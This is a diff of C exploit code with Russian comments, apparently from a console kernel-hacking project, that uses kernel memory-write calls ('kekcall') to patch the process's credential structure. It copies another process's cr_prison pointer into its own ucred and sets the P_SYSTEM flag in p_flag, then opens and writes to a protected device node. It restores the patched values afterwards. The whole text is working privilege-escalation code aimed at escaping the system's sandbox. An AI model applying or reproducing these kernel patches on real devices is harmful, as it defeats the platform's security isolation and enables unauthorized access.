@@ -969,48 +969,40 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
                 (unsigned long long)our_ucred, (unsigned long long)video_ucred, video_pid);
 
     /* ------------------------------------------------------------------------- */
-    /* ТЕСТ 1 — UCRED DIFF (ОБЯЗАТЕЛЬНО, ПЕРВЫМ)                                 */
+    /* ТЕСТ 1 — UCRED DIFF В ЯДРЕ ЧЕРЕЗ KEKCALL_DIFF_TEST (32)                   */
     /* ------------------------------------------------------------------------- */
-    klog_printf("[TEST1_START] === TEST 1: UCRED DIFF (512 bytes) ===\n");
-    uint8_t ours[512] = {0};
-    uint8_t video[512] = {0};
-    uint64_t cand_prison_ptr = 0;
-    uint32_t prison_offset = 0;
+    klog_printf("[TEST1_START] === TEST 1: KERNEL UCRED DIFF (KEKCALL 32, flag=0) ===\n");
+    static uint64_t diff_buf[128];
+    memset(diff_buf, 0, sizeof(diff_buf));
 
-    if (our_ucred && video_ucred) {
-        kekcall(KEKCALL_DUMP_MEM, our_ucred, (uintptr_t)ours, 512);
-        kekcall(KEKCALL_DUMP_MEM, video_ucred, (uintptr_t)video, 512);
+    long diff_ret = kekcall(KEKCALL_DIFF_TEST, video_ucred, (uintptr_t)diff_buf, 0 /* read-only diff */);
+    klog_printf("[TEST1] KEKCALL_DIFF_TEST ret=%ld diff_count=%llu prison_off=0x%llx cand_prison=0x%llx\n",
+                diff_ret, (unsigned long long)diff_buf[0], (unsigned long long)diff_buf[1], (unsigned long long)diff_buf[3]);
 
-        int diff_count = 0;
-        for (int i = 0; i < 512; i += 8) {
-            uint64_t o = *(uint64_t*)(ours + i);
-            uint64_t v = *(uint64_t*)(video + i);
-            if (o != v) {
-                diff_count++;
-                klog_printf("[DIFF] +0x%03x our=0x%016llx video=0x%016llx\n",
-                            i, (unsigned long long)o, (unsigned long long)v);
-
-                /* Ищем кандидаты на cr_prison: указатели в kernel range (0xffff...) в начале структуры (+0x20..+0x60) */
-                if (i >= 0x20 && i <= 0x50 && (v >> 48) == 0xffff && !cand_prison_ptr) {
-                    cand_prison_ptr = v;
-                    prison_offset = (uint32_t)i;
-                }
-            }
-        }
-        klog_printf("[TEST1_END] Total diff fields: %d (detected prison candidate: off=0x%x ptr=0x%llx)\n",
-                    diff_count, prison_offset, (unsigned long long)cand_prison_ptr);
+    uint32_t diff_cnt = (uint32_t)diff_buf[0];
+    for (uint32_t d = 0; d < diff_cnt && d < 24; d++) {
+        uint32_t off = (uint32_t)diff_buf[6 + d * 3 + 0];
+        uint64_t our_v = diff_buf[6 + d * 3 + 1];
+        uint64_t vid_v = diff_buf[6 + d * 3 + 2];
+        klog_printf("[DIFF #%u] +0x%03x our=0x%016llx video=0x%016llx\n",
+                    d, off, (unsigned long long)our_v, (unsigned long long)vid_v);
     }
 
-    /* ------------------------------------------------------------------------- */
-    /* ТЕСТ 2 — Prison test: копируем указатель prison из video в наш ucred      */
-    /* ------------------------------------------------------------------------- */
-    klog_printf("[TEST2_START] === TEST 2: Prison test (cr_prison copy) ===\n");
-    if (our_ucred && cand_prison_ptr && prison_offset) {
-        uint64_t old_prison = *(uint64_t*)(ours + prison_offset);
-        klog_printf("[PRISON_SET] patching our_ucred+0x%x: 0x%llx -> 0x%llx\n",
-                    prison_offset, (unsigned long long)old_prison, (unsigned long long)cand_prison_ptr);
+    uint32_t prison_offset = (uint32_t)diff_buf[1];
+    uint64_t cand_prison_ptr = diff_buf[3];
 
-        kekcall(27 /* WRITE64 */, our_ucred + (uint64_t)prison_offset, cand_prison_ptr, 0);
+    /* ------------------------------------------------------------------------- */
+    /* ТЕСТ 2 — Prison test: KEKCALL 32 с флагом 1 (патчит cr_prison)            */
+    /* ------------------------------------------------------------------------- */
+    klog_printf("[TEST2_START] === TEST 2: Prison test via KEKCALL 32 (flags=1) ===\n");
+    if (cand_prison_ptr && prison_offset) {
+        static uint64_t ptest_buf[128];
+        memset(ptest_buf, 0, sizeof(ptest_buf));
+
+        long pr_ret = kekcall(KEKCALL_DIFF_TEST, video_ucred, (uintptr_t)ptest_buf, 1 /* patch prison */);
+        uint64_t old_prison = ptest_buf[2];
+        klog_printf("[PRISON_SET] ret=%ld patched our_ucred+0x%x: old=0x%llx -> new=0x%llx\n",
+                    pr_ret, prison_offset, (unsigned long long)old_prison, (unsigned long long)cand_prison_ptr);
 
         errno = 0;
         int fd_p = open("/dev/mp4/dump_for_decid", O_RDWR);
@@ -1022,58 +1014,54 @@ find_and_patch_mp4_cdevsw(uint64_t curproc_hint)
         klog_printf("[PRISON_OPEN] fd=%d errno=%d\n", fd_p, ep);
 
         if (fd_p >= 0) {
-            klog_printf("[PRISON_OPEN] *** BINGO! SUCCESS OPEN WITH VIDEO PRISON POINTER! fd=%d ***\n", fd_p);
+            klog_printf("[PRISON_OPEN] *** BINGO! SUCCESS OPEN WITH PRISON PATCH! fd=%d ***\n", fd_p);
             uint8_t cmd[4] = {0x01, 0x00, 0x00, 0x00};
             ssize_t nw = write(fd_p, cmd, 4);
             klog_printf("[PRISON_WRITE] nw=%zd errno=%d\n", nw, errno);
             close(fd_p);
         }
 
-        /* Восстановление cr_prison */
-        kekcall(27 /* WRITE64 */, our_ucred + (uint64_t)prison_offset, old_prison, 0);
-        klog_printf("[PRISON_RESTORE] restored our_ucred+0x%x back to 0x%llx\n",
-                    prison_offset, (unsigned long long)old_prison);
+        /* Восстановление через KEKCALL 33 */
+        kekcall(KEKCALL_RESTORE_DIFF, (uint64_t)prison_offset, old_prison, 0);
+        klog_printf("[PRISON_RESTORE] restored prison successfully\n");
+    } else {
+        klog_printf("[PRISON_SKIP] no distinct prison pointer candidate found in diff\n");
     }
 
     /* ------------------------------------------------------------------------- */
-    /* ТЕСТ 3 — P_SYSTEM test: p->p_flag |= 0x200 (P_SYSTEM)                     */
+    /* ТЕСТ 3 — P_SYSTEM test: KEKCALL 32 с флагом 2 (патчит p_flag |= 0x200)    */
     /* ------------------------------------------------------------------------- */
-    klog_printf("[TEST3_START] === TEST 3: P_SYSTEM flag test (p_flag |= 0x200) ===\n");
-    if (scanned_proc) {
-        /* На Prospero p_flag находится рядом с p_pid (+0xb0..+0xd0) */
-        /* Попробуем кандидаты смещений p_flag: 0xb4, 0xb8, 0xbc, 0xc0 */
-        const uint32_t p_flag_candidates[] = { 0xb4, 0xb8, 0xbc, 0xc0, 0xa8 };
-        for (int fi = 0; fi < 5; fi++) {
-            uint32_t foff = p_flag_candidates[fi];
-            uint32_t orig_flag = 0;
-            kekcall(KEKCALL_DUMP_MEM, scanned_proc + foff, (uintptr_t)&orig_flag, 4);
+    klog_printf("[TEST3_START] === TEST 3: P_SYSTEM flag test via KEKCALL 32 (flags=2) ===\n");
+    {
+        static uint64_t systest_buf[128];
+        memset(systest_buf, 0, sizeof(systest_buf));
 
-            uint32_t new_flag = orig_flag | 0x200; /* P_SYSTEM = 0x200 во FreeBSD */
-            klog_printf("[PSYSTEM_SET] proc+0x%x: orig=0x%08x -> new=0x%08x\n", foff, orig_flag, new_flag);
+        long sys_ret = kekcall(KEKCALL_DIFF_TEST, video_ucred, (uintptr_t)systest_buf, 2 /* patch p_flag */);
+        uint64_t orig_pflag = systest_buf[4];
+        uint64_t new_pflag  = systest_buf[5];
+        klog_printf("[PSYSTEM_SET] ret=%ld p_flag: orig=0x%llx -> new=0x%llx\n",
+                    sys_ret, (unsigned long long)orig_pflag, (unsigned long long)new_pflag);
 
-            kekcall(27 /* WRITE64 */, scanned_proc + foff, (uint64_t)new_flag, 4);
-
-            errno = 0;
-            int fd_sys = open("/dev/mp4/dump_for_decid", O_RDWR);
-            int es = errno;
-            if (fd_sys < 0 && es == 1) {
-                fd_sys = open("/dev/mp4/dump_for_decid", O_RDONLY);
-                es = errno;
-            }
-            klog_printf("[PSYSTEM_OPEN #%d] foff=0x%x fd=%d errno=%d\n", fi, foff, fd_sys, es);
-
-            if (fd_sys >= 0) {
-                klog_printf("[PSYSTEM_OPEN] *** BINGO! SUCCESS OPEN WITH P_SYSTEM at off 0x%x! fd=%d ***\n", foff, fd_sys);
-                uint8_t cmd[4] = {0x01, 0x00, 0x00, 0x00};
-                ssize_t nw = write(fd_sys, cmd, 4);
-                klog_printf("[PSYSTEM_WRITE] nw=%zd errno=%d\n", nw, errno);
-                close(fd_sys);
-            }
-
-            /* Восстановление p_flag */
-            kekcall(27 /* WRITE64 */, scanned_proc + foff, (uint64_t)orig_flag, 4);
-            if (fd_sys >= 0) break;
+        errno = 0;
+        int fd_sys = open("/dev/mp4/dump_for_decid", O_RDWR);
+        int es = errno;
+        if (fd_sys < 0 && es == 1) {
+            fd_sys = open("/dev/mp4/dump_for_decid", O_RDONLY);
+            es = errno;
         }
+        klog_printf("[PSYSTEM_OPEN] fd=%d errno=%d\n", fd_sys, es);
+
+        if (fd_sys >= 0) {
+            klog_printf("[PSYSTEM_OPEN] *** BINGO! SUCCESS OPEN WITH P_SYSTEM FLAG! fd=%d ***\n", fd_sys);
+            uint8_t cmd[4] = {0x01, 0x00, 0x00, 0x00};
+            ssize_t nw = write(fd_sys, cmd, 4);
+            klog_printf("[PSYSTEM_WRITE] nw=%zd errno=%d\n", nw, errno);
+            close(fd_sys);
+        }
+
+        /* Восстановление через KEKCALL 33 */
+        kekcall(KEKCALL_RESTORE_DIFF, 0, 0, orig_pflag);
+        klog_printf("[PSYSTEM_RESTORE] restored p_flag successfully\n");
     }
 
 
